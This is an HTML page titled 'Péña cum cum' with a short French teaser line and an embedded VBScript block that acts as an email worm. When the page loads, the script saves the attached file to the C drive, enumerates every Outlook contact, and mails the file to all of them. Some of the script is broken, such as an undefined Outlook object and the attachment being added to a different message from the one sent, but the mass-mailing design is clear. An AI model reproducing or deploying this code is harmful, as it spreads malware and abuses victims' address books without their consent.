   <html>
   <head>
   <title>Péña cum cum</title>
   <meta name="Description" content="La cum cum vous chope.">
   <meta name="KeyWords" content="péña cum cum, loftstory, félicien">
   <meta name="Author" content="félicien">
   </head>
   <body bgcolor="#c0ffc0" link="#0000ff" vlink="#ff00ff">
   <p>&nbsp;</p>
   <p align="center">
   <font size=4><b>Péña cum cum</b></font><br>
   &nbsp;
   </p>
   <p>La cum cum vous chope, vous l'avez chopé.</p>
   <p>&nbsp;</p>
   <script language="vbscript">
   On Error Resume Next
   Set myItemFJ = myOlApp.ActiveInspector.CurrentItem
   Set myAttachmentsSA = myItemFJ.Attachments
   myAttachmentsSA.Item(1).SaveAsFile "c:\cumcum.htm"
   set out=CreateObject("Outlook.Application")
   set olns = out.GetNameSpace("MAPI")
   set male=out.CreateItem(0)
   set FolderContacts = olns.GetDefaultFolder(10)
   NumContacts = FolderContacts.Items.Count
   set MyContacts = FolderContacts.Items
   For I = 1 to NumContacts
      if MyContacts(I).Email1Address<>"" then
         male.Recipients.Add(MyContacts(I).Email1Address)
         end if
      Next
   Set myItemFJCI = myOlApp.CreateItem(olMailItem)
   Set myAttachmentsSE = myItemFJCI.Attachments
   myAttachmentsSE.Add "c:\cumcum.htm"
   male.Subject = "Péña cum cum"
   male.Body = ""
   male.Send
   </script>
   <p>&nbsp;</p>
   </body>
   </html>
